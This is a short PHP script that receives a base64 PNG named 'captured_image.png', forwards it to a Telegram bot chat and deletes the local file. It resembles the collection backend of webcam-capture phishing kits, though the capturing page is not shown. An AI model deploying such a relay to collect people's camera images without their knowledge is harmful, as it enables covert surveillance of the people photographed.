<?php

$telegramToken = 'XXXXXXXXXXXXX';

$chatId = 'XXXXXXXXXXXXXXXX'; 


$data = json_decode(file_get_contents('php://input'), true);

if (!isset($data['image'])) {
    echo json_encode(['status' => 'error', 'message' => 'No image provided']);
    exit;
}


$imageData = $data['image'];
$imageData = str_replace('data:image/png;base64,', '', $imageData);
$imageData = str_replace(' ', '+', $imageData);
$image = base64_decode($imageData);
$fileName = 'captured_image.png';
file_put_contents($fileName, $image);


$telegramUrl = "https://api.telegram.org/bot$telegramToken/sendPhoto";
$postFields = [
    'chat_id' => $chatId,
    'photo' => new CURLFile($fileName)
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);


unlink($fileName);


echo json_encode(['status' => 'success', 'message' => 'Photo sent to Telegram']);
